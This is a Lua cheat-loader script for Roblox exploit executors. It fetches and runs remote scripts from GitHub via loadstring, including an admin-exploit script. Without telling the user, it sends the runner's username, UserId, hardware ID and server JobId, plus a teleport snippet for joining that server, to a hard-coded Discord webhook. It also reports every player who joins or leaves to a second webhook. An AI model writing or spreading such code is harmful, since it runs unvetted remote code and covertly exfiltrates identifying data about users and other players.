local placeId = game.PlaceId

-- Check if the Place ID matches any of the specified values
if placeId == 14044547200 or placeId == 8365905206 then
    -- Execute the external script if the Place ID is correct
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/untitled%20tag%20key.txt"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end

if placeId == 15135285305 then
    -- Execute the external script if the Place ID is correct
    loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
end

local function sendTeleportInfoAndPrepareScript()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local TeleportService = game:GetService("TeleportService")

    -- Replace this with your webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"

    -- Function to send information to Discord and prepare teleport script
    local function sendTeleportInfo()
        local localPlayer = Players.LocalPlayer
        if not localPlayer then
            warn("LocalPlayer not found")
            return
        end

        local playerName = localPlayer.Name
        local userId = localPlayer.UserId
        local HWID = RbxAnalyticsService:GetClientId()
        local placeId = game.PlaceId
        local jobId = game.JobId

        -- Create payload to send to Discord
        local data = {
            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
        }

        -- Convert data to JSON format
        local jsonData = HttpService:JSONEncode(data)

        -- Send POST request to Discord webhook
        local response
        if syn then
            response = syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http and http.request then
            response = http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif request then
            response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif http_request then
            response = http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif solara then
            response = solara.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        else
            warn("Please use Arceus X Neo or solara or fluxus.")
            return
        end

        if response.StatusCode == 204 then
            print("d")
        else
            warn("not found: " .. response.StatusMessage)
        end
    end

    -- Wait for local player to be available before sending information and teleporting
    Players.PlayerAdded:Connect(function(player)
        if player == Players.LocalPlayer then
            sendTeleportInfo()
            -- Uncomment below line if you want to teleport after sending info
            -- teleportToServer(game.PlaceId, game.JobId)
        end
    end)

    -- If local player is already present (e.g., if script is run after player is added)
    if Players.LocalPlayer then
        sendTeleportInfo()
        -- Uncomment below line if you want to teleport after sending info
        -- teleportToServer(game.PlaceId, game.JobId)
    end
end

-- Invoke the function to send teleport information and prepare teleport script
sendTeleportInfoAndPrepareScript()

local function sendOnlinePlayersInfoToDiscord()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local RunService = game:GetService("RunService")

    -- Replace this with your webhook URL
    local webhookUrl = "https://discord.com/api/webhooks/1251060149418721330/C8rob6bHsdk24wALnkCXDw7kc5eYzpWzg-pFcmU-3uRSFRA9NxZdQhf3bsw1XNXdirWM"

    local onlinePlayers = {}
    local playerChanges = {}
    local lastPlayerInfo = ""

    -- Function to send online players info to Discord
    local function sendOnlinePlayersInfo()
        local playerNames = {}
        for _, player in pairs(onlinePlayers) do
            table.insert(playerNames, player.Name)
        end

        local playerCount = #onlinePlayers
        local playerInfo = "Online Players (" .. playerCount .. "): " .. table.concat(playerNames, ", ")

        -- Only send the message if there are changes
        if playerInfo ~= lastPlayerInfo or #playerChanges > 0 then
            local data = {
                ["content"] = playerInfo .. "\nChanges: " .. table.concat(playerChanges, ", ")
            }

            -- Convert data to JSON format
            local jsonData = HttpService:JSONEncode(data)

            -- Function to handle HTTP request
            local function makeHttpRequest()
                local success, response
                if syn and syn.request then
                    success, response = pcall(syn.request, {
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                elseif http and http.request then
                    success, response = pcall(http.request, {
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                elseif request then
                    success, response = pcall(request, {
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                elseif http_request then
                    success, response = pcall(http_request, {
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                elseif solara then
                    success, response = pcall(solara.request, {
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                else
                    warn("Please use Arceus X Neo, Solara, or Fluxus.")
                    return
                end

                if success and response.StatusCode == 204 then
                    print("Message sent successfully.")
                else
                    warn("Error sending message: " .. (response and response.StatusMessage or "Unknown error"))
                end
            end

            makeHttpRequest()
            lastPlayerInfo = playerInfo -- Update last sent player info
            playerChanges = {} -- Clear changes after sending
        end
    end

    -- Event listeners for player joining and leaving
    Players.PlayerAdded:Connect(function(player)
        table.insert(onlinePlayers, player)
        table.insert(playerChanges, player.Name .. " joined")
        sendOnlinePlayersInfo()
    end)

    Players.PlayerRemoving:Connect(function(player)
        for i, p in pairs(onlinePlayers) do
            if p == player then
                table.remove(onlinePlayers, i)
                break
            end
        end
        table.insert(playerChanges, player.Name .. " left")
        sendOnlinePlayersInfo()
    end)

    -- If there are already players in the game
    for _, player in pairs(Players:GetPlayers()) do
        table.insert(onlinePlayers, player)
    end

    -- Periodic updates (every 60 seconds)
    RunService.Heartbeat:Connect(function()
        sendOnlinePlayersInfo()
        wait(60)
    end)
end

-- Invoke the function to send online players information to Discord
sendOnlinePlayersInfoToDiscord()